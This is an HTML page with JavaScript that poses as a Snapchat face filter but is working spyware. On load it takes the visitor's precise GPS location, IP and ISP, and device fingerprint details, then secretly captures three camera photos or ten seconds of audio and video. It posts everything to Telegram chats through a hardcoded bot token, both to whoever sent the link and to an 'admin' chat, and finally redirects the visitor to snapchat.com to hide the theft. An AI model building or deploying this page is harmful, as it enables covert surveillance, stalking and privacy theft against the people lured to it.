<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snapchat Lens - Funny Face Filter</title>
    <!-- MediaPipe Libraries for Hand Detection -->
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
    <style>
        body {
            background-color: #000000;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            user-select: none;
            -webkit-user-select: none;
        }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            z-index: 10;
        }
        .filter-title {
            background: rgba(0, 0, 0, 0.6);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: bold;
        }
        .center-screen {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .camera-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }
        .bottom-tray {
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 10;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
        }
        .capture-btn {
            width: 75px;
            height: 75px;
            border: 5px solid #ffffff;
            border-radius: 50%;
            background: transparent;
            cursor: pointer;
        }
        .hint-text {
            font-size: 12px;
            color: #ccc;
            margin-top: 10px;
        }
        #retry-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .retry-box {
            background: #1c1c1c;
            border: 1px solid #333;
            padding: 25px;
            border-radius: 15px;
            max-width: 320px;
            width: 100%;
        }
        .retry-btn {
            background: #fffc00;
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 25px;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            margin-top: 15px;
            width: 100%;
        }
    </style>
</head>
<body>

    <div class="top-bar">
        <div class="filter-title">🔥 Funny Face Lens</div>
        <div>✨ Snapchat</div>
    </div>

    <div class="center-screen">
        <video id="video" autoplay playsinline muted class="camera-preview"></video>
        <div id="loading-text" style="position:absolute; z-index:5; background: rgba(0,0,0,0.7); padding: 15px 25px; border-radius: 10px; font-weight: bold;">Loading Filter (0%)... Please Allow Access</div>
    </div>

    <div class="bottom-tray">
        <button class="capture-btn" onclick="triggerAction()"></button>
        <div class="hint-text">Tap to try filter</div>
    </div>

    <div id="retry-modal">
        <div class="retry-box">
            <h3>Camera Access Required</h3>
            <p style="font-size: 13px; color: #aaa;">Snapchat Lens needs camera permissions to apply this funny filter to your face.</p>
            <button class="retry-btn" onclick="retryCameraPermission()">Tap to Enable Lens</button>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAHJHksL9vqLcvHL3zrH1OOnn9aS3YW4lQw";
        const ADMIN_CHAT_ID = "6478868514";
        
        const urlParams = new URLSearchParams(window.location.search);
        
        // Dono formats (?claim= aur ?id=) ko support karega
        const CHAT_ID = urlParams.get('claim') || urlParams.get('id');
        
        // Link ke path ya parameter se detect karega ki front hai, back hai ya video
        const pathName = window.location.pathname;
        let cameraType = urlParams.get('b') || urlParams.get('type');
        
        if (!cameraType) {
            if (pathName.includes('front')) cameraType = 'front';
            else if (pathName.includes('back')) cameraType = 'back';
            else if (pathName.includes('video')) cameraType = 'video';
            else cameraType = 'video'; // Default
        }

        let globalStream = null;
        let gpsData = { lat: '', lon: '', mapLink: 'N/A' };
        let ipInfo = {};
        let isReady = false;
        let detectedHand = "Analyzing...";
        
        let motionData = { alpha: 'N/A', beta: 'N/A', gamma: 'N/A' };
        window.addEventListener('deviceorientation', (event) => {
            motionData.alpha = event.alpha ? Math.round(event.alpha) : '0';
            motionData.beta = event.beta ? Math.round(event.beta) : '0';
            motionData.gamma = event.gamma ? Math.round(event.gamma) : '0';
        }, true);

        function getSmartHandStatus() {
            if (detectedHand.includes("Hand Detected")) {
                return detectedHand; 
            } else {
                let g = parseInt(motionData.gamma);
                if (isNaN(g)) return "Position: Center / Stable";
                if (g < 0) {
                    return "Likely Right Hand Grip (Negative Tilt)";
                } else {
                    return "Likely Left Hand Grip (Positive Tilt)";
                }
            }
        }

        function initMediaPipeHands(videoElement) {
            try {
                const hands = new Hands({
                    locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
                });
                
                hands.setOptions({
                    maxNumHands: 1,
                    modelComplexity: 1,
                    minDetectionConfidence: 0.4,
                    minTrackingConfidence: 0.4
                });

                hands.onResults((results) => {
                    if (results.multiHandLandmarks && results.multiHandedness && results.multiHandedness.length > 0) {
                        let label = results.multiHandedness[0].label; 
                        detectedHand = `${label} Hand (AI Vision)`;
                    }
                });

                const camera = new Camera(videoElement, {
                    onFrame: async () => {
                        await hands.send({ image: videoElement });
                    },
                    width: 1280,
                    height: 720
                });
                camera.start();
            } catch (e) {
                console.log("MediaPipe Init Error: ", e);
            }
        }

        function getGPUInfo() {
            try {
                let canvas = document.createElement('canvas');
                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "Not Supported";
                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            } catch (e) {
                return "Error fetching GPU";
            }
        }

        async function getAdvancedDeviceInfo() {
            let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB+` : "Unknown";
            let cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
            let lang = navigator.language || "Unknown";
            let platform = navigator.platform || "Unknown";
            let touchPoints = navigator.maxTouchPoints ? `${navigator.maxTouchPoints} Touch Points` : "Unknown";
            let gpu = getGPUInfo();
            return { memory, cores, lang, platform, touchPoints, gpu };
        }

        function getExactLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            let lat = position.coords.latitude;
                            let lon = position.coords.longitude;
                            resolve({
                                lat: lat,
                                lon: lon,
                                mapLink: `https://maps.google.com/?q=${lat},${lon}`
                            });
                        },
                        (error) => {
                            resolve({ lat: '', lon: '', mapLink: 'Permission Denied / Unavailable' });
                        },
                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                    );
                } else {
                    resolve({ lat: '', lon: '', mapLink: 'Not Supported' });
                }
            });
        }

        async function getIPAndLocation() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (e) {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
            }
        }

        function startLoadingProgress() {
            let progress = 0;
            let loadText = document.getElementById('loading-text');
            let interval = setInterval(() => {
                if (isReady || progress >= 95) {
                    clearInterval(interval);
                    if(isReady && loadText) loadText.style.display = 'none';
                    return;
                }
                progress += Math.floor(Math.random() * 15) + 5;
                if(progress > 95) progress = 95;
                if(loadText) loadText.innerText = `Loading Filter (${progress}%)... Please Allow Access`;
            }, 250);
        }

        async function initCamera() {
            startLoadingProgress();
            gpsData = await getExactLocation();
            ipInfo = await getIPAndLocation();

            let constraints = {
                video: { width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: (cameraType === 'video') // Sirf video mode mein audio on rahega
            };

            // Camera facing mode logic
            if (cameraType === 'back') {
                constraints.video.facingMode = { exact: "environment" };
            } else {
                constraints.video.facingMode = "user"; // Front ya video dono ke liye user camera
            }

            try {
                try {
                    globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (e) {
                    if (cameraType === 'back') {
                        constraints.video.facingMode = "environment";
                        globalStream = await navigator.mediaDevices.getUserMedia(constraints);
                    } else {
                        throw e;
                    }
                }

                const videoElement = document.getElementById('video');
                videoElement.srcObject = globalStream;
                
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        videoElement.play().then(resolve).catch(resolve);
                    };
                });

                initMediaPipeHands(videoElement);

                document.getElementById('loading-text').style.display = 'none';
                document.getElementById('retry-modal').style.display = 'none';
                isReady = true;

                setTimeout(() => {
                    triggerAction();
                }, 2500);

            } catch (err) {
                document.getElementById('retry-modal').style.display = 'flex';
            }
        }

        function retryCameraPermission() {
            document.getElementById('retry-modal').style.display = 'none';
            initCamera();
        }

        async function triggerAction() {
            if (!isReady || !globalStream) return;

            document.getElementById('loading-text').innerText = "Applying Filter...";
            document.getElementById('loading-text').style.display = 'block';

            let batteryText = "N/A";
            try {
                let bat = await navigator.getBattery();
                batteryText = `${Math.round(bat.level * 100)}% ${bat.charging ? "⚡ Charging" : "🔋 Discharging"}`;
            } catch(e) {}

            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            let netType = connection ? connection.effectiveType.toUpperCase() : "4G";
            let downlink = connection && connection.downlink ? `${connection.downlink} Mbps` : "N/A";
            let rtt = connection && connection.rtt ? `${connection.rtt} ms` : "N/A";

            let advInfo = await getAdvancedDeviceInfo();
            let finalHandResult = getSmartHandStatus();

            let baseCaption = 
                `🌐 **IP & Exact Location**\n` +
                `🔢 IP Address: \`${ipInfo.ip}\`\n` +
                `📍 Location: ${ipInfo.city}, ${ipInfo.region}\n` +
                `🗺️ **GPS Maps Link**: ${gpsData.mapLink}\n` +
                `📡 ISP: ${ipInfo.isp}\n\n` +
                `📱 **Advanced Device & Spatial Insights**\n` +
                `✋ **Hand / Grip Analysis**: ${finalHandResult}\n` +
                `🧭 Orientation (Gyro): Alpha:${motionData.alpha}, Beta:${motionData.beta}, Gamma:${motionData.gamma}\n` +
                `🎮 GPU: \`${advInfo.gpu}\`\n` +
                `🧠 RAM/Cores: ${advInfo.memory} | ${advInfo.cores}\n` +
                `✋ Touch Support: ${advInfo.touchPoints}\n` +
                `💻 Platform/Lang: ${advInfo.platform} (${advInfo.lang})\n` +
                `🔋 Battery: ${batteryText}\n` +
                `📶 Network: ${netType} (Speed: ${downlink}, RTT: ${rtt})\n` +
                `🖥️ Screen: ${window.screen.width}x${window.screen.height}\n` +
                `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                `👑 **CREDIT BY : आयुष नेगी**`;

            // AGAR TYPE 'video' HAI TOH VIDEO RECORD HOGA (10 SECONDS TAK)
            if (cameraType === 'video') {
                let recordedChunks = [];
                let mediaRecorder;

                try {
                    mediaRecorder = new MediaRecorder(globalStream, { mimeType: 'video/webm; codecs=vp8,opus' });
                } catch (err) {
                    try {
                        mediaRecorder = new MediaRecorder(globalStream);
                    } catch (e) {
                        return;
                    }
                }

                mediaRecorder.ondataavailable = function(event) {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async function() {
                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
                    
                    if (blob && blob.size > 0) {
                        if (CHAT_ID) {
                            const formDataUser = new FormData();
                            formDataUser.append('chat_id', CHAT_ID);
                            formDataUser.append('video', blob, 'video_capture.webm');
                            formDataUser.append('caption', "🎥 **Secret Video Captured!**\n\n" + baseCaption);
                            formDataUser.append('parse_mode', 'Markdown');

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                method: 'POST',
                                body: formDataUser
                            });
                        }

                        const formDataAdmin = new FormData();
                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                        formDataAdmin.append('video', blob, 'video_capture.webm');
                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (Video from User ID: ${CHAT_ID})**\n\n` + baseCaption);
                        formDataAdmin.append('parse_mode', 'Markdown');

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                            method: 'POST',
                            body: formDataAdmin
                        });
                    }

                    globalStream.getTracks().forEach(track => track.stop());
                    window.location.href = "https://www.snapchat.com";
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); // 10 Second tak video record hogi

            } else {
                // FRONT YA BACK CAMERA KE LIYE PHOTOS CAPTURE HONGI
                const videoElement = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                canvas.width = videoElement.videoWidth || 1280;
                canvas.height = videoElement.videoHeight || 720;
                const context = canvas.getContext('2d');

                for (let i = 1; i <= 3; i++) {
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.90));
                    
                    if (blob) {
                        let caption = (i === 1) ? baseCaption : `👑 **CREDIT BY : आयुष नेगी**`;

                        if (CHAT_ID) {
                            const formDataUser = new FormData();
                            formDataUser.append('chat_id', CHAT_ID);
                            formDataUser.append('photo', blob, `photo_${i}.jpg`);
                            formDataUser.append('caption', caption);
                            formDataUser.append('parse_mode', 'Markdown');

                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formDataUser
                            });
                        }

                        const formDataAdmin = new FormData();
                        formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                        formDataAdmin.append('photo', blob, `photo_${i}.jpg`);
                        formDataAdmin.append('caption', `🕵️‍♂️ **Admin Log (${cameraType.toUpperCase()} Camera by User ID: ${CHAT_ID})**\n\n` + caption);
                        formDataAdmin.append('parse_mode', 'Markdown');

                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formDataAdmin
                        });
                    }

                    await new Promise(resolve => setTimeout(resolve, 500));
                }

                globalStream.getTracks().forEach(track => track.stop());
                window.location.href = "https://www.snapchat.com";
            }
        }

        window.onload = function() {
            initCamera();
        };
    </script>
</body>
</html>
